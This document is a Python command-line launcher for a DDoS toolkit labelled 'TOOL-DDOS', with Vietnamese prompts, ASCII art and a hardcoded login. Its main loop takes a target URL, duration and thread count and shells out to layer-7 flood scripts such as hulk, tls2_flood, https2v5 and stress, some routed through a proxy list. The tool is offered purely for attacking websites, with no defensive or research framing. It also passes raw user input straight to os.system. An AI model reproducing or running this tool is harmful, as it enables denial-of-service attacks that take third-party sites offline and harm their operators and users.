# -*- coding: utf-8 -*-
from multiprocessing.connection import wait
import socket
import os
import random
import getpass
import time
import sys
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

proxys = open('proxies.txt').readlines()
bots = len(proxys)
def si():
    print('\x1b[38;2;255;20;147mWelcome to TOOL-DDOS \x1b[38;2;233;233;233mBy BINEK111 CODER')
    print("")
def title():
    clear()
    si()
    print(f'''      


           \x1b[38;2;0;255;255m███╗░░░███╗███████╗████████╗██╗░\x1b[38;2;255;20;147m░██╗░█████╗░██████╗░░██████╗
           \x1b[38;2;0;255;255m████╗░████║██╔════╝╚══██╔══╝██║░\x1b[38;2;255;20;147m░██║██╔══██╗██╔══██╗██╔════╝
           \x1b[38;2;0;255;255m██╔████╔██║█████╗░░░░░██║░░░████\x1b[38;2;255;20;147m███║██║░░██║██║░░██║╚█████╗░
           \x1b[38;2;0;255;255m██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔═\x1b[38;2;255;20;147m═██║██║░░██║██║░░██║░╚═══██╗
           \x1b[38;2;0;255;255m██║░╚═╝░██║███████╗░░░██║░░░██║░\x1b[38;2;255;20;147m░██║╚█████╔╝██████╔╝██████╔╝
           \x1b[38;2;0;255;255m╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░\x1b[38;2;255;20;147m░╚═╝░╚════╝░╚═════╝░╚═════╝░        
                      \x1b[38;2;0;255;255m╚══════════════╦═════\x1b[38;2;255;20;147m════╦══════════════╝
                \x1b[38;2;0;255;255m╔════════════════════╩\x1b[38;2;0;255;255m[Meth\x1b[38;2;255;20;147mods]╩════════════════════╗
                \x1b[38;2;0;255;255m║  \x1b[38;2;0;255;255mhulk            \x1b[38;2;0;255;255m|  \x1b[38;2;0;255;255mhttp-\x1b[38;2;255;20;147msockets   \x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mtls2_flood  \x1b[38;2;255;20;147m║  
                \x1b[38;2;0;255;255m║  \x1b[38;2;0;255;255mhttp-raw        \x1b[38;2;0;255;255m|  \x1b[38;2;0;255;255mhttps\x1b[38;2;255;20;147m2v5       \x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147msever       \x1b[38;2;255;20;147m║
                \x1b[38;2;0;255;255m║  \x1b[38;2;0;255;255mhttp-rand       \x1b[38;2;0;255;255m|  \x1b[38;2;0;255;255mstres\x1b[38;2;255;20;147ms         \x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mhttps1      \x1b[38;2;255;20;147m║
                \x1b[38;2;0;255;255m╚═══════════════╦═════════\x1b[38;2;0;255;255m═\x1b[38;2;255;20;147m═════════╦═══════════════╝
            \x1b[38;2;0;255;255m╔═══════════════════╩══════════\x1b[38;2;255;20;147m═════════╩═══════════════════════════╗
            \x1b[38;2;0;255;255m║ \x1b[38;2;0;255;255mhttp-mix    \x1b[38;2;0;255;255m |  \x1b[38;2;0;255;255mđang cập nhật     \x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mđang cập nhật\x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mđang cập nhật\x1b[38;2;255;20;147m║  
            \x1b[38;2;0;255;255m║ \x1b[38;2;0;255;255mđang cập nhật\x1b[38;2;0;255;255m|  \x1b[38;2;0;255;255mđang cập nhật     \x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mđang cập nhật\x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mđang cập nhật\x1b[38;2;255;20;147m║  
            \x1b[38;2;0;255;255m║ \x1b[38;2;0;255;255mđang cập nhật\x1b[38;2;0;255;255m|  \x1b[38;2;0;255;255mđang cập nhật     \x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mđang cập nhật\x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mđang cập nhật\x1b[38;2;255;20;147m║  
            \x1b[38;2;0;255;255m╚═══════════════════╦══════════\x1b[38;2;255;20;147m═════════╦═══════════════════════════╝
                \x1b[38;2;0;255;255m╔═══════════════╩══════════\x1b[38;2;255;20;147m═════════╩═══════════════╗

                                       .-"      "-.
                                      /            \
                                     |              |
                                     |,  .-.  .-.  ,|
                                     | )(__/  \__)( |
                                     |/     /\     \|
                                     (_     ^^     _)
                                      \__|IIIIII|__/
                                       | \IIIIII/ |
                                       \          /
                                         --------`                                                   ''')
def main():
    title()
    while(True):
        cnc = input('''\x1bChọn Methods Để Attack:''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        if cnc == "methods" or cnc == "METHODS" or cnc == "MS" or cnc == "ms":
            methods()        
# LAYER 7 METHODS
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKETS.js {url} {per} {time}')
            except IndexError:
                print('Cách sử dụng: http-socket <url> <per> <time>')
                print('Ví dụ: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW.js {url} {time}')
            except IndexError:
                print('Cách sử dụng: http-raw <url> <time>')
                print('Ví dụ: http-raw http://example.com 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Cách sử dụng: http-rand <url> <time>')
                print('Ví dụ: http-rand http://example.com 60')

        elif "hulk" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run hulk.go -site {url} {method} nil')
            except IndexError:
                print('Cách sử dụng: hulk <url> METHODS<GET/POST>')
                print('Ví dụ: hulk http://example.com GET')

        elif "tls2_flood" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node tls2_flood GET {url} proxies.txt {time} 1000 {threads}')
            except IndexError:
                print('Cách sử dụng: tls2_flood <url> <time> <threads>')
                print('Ví dụ: tls2_flood http://example.com 120 5')

        elif "https1" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node https1 {url} 10 2000 {time}')
            except IndexError:
                print('Cách sử dụng: https1 <url> <time>')
                print('Ví dụ: https1 http://example.com 120')

        elif "https2v5" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node https2v5 GET {url} proxies.txt {time} 200 10')
            except IndexError:
                print('Cách sử dụng: https2v5 <url> <time>')
                print('Ví dụ: https2v5 https://example.com 120')    
        
        elif "stress" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2] 
                time = cnc.split()[3]
                timeout = cnc.split()[4]
                os.system(f'go run stress.go {url} {port} 3 2000 {time} {timeout}')
            except IndexError:
                print('Cách sử dụng: stress <url> <port> <time> <timeout>')
                print('Ví dụ: stress https://example.com 443 120 120')

        elif "sever" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run sever.go -site {url} {method}')
            except IndexError:
                print('Cách sử dụng: sever <url> <GET/POST>')
                print('Ví dụ: sever https://example.com GET')

        elif "http-mix" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-MIX {url} {time}')
            except IndexError:
                print('Cách sử dụng: http-mix <url> <time>')
                print('Ví dụ: http-mix https://example.com 120')                
        
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass             
def login():
    clear()
    user = "FREE"
    passwd = "FREE"
    username = input("⚡ Username: ")
    password = input("⚡ Password: ")
    if username != user or password != passwd:
        print("")
        print("⚡ Xin Lỗi Bạn Đã Nhập Sai Pass")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome To TOOL-DDOS [v1]")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
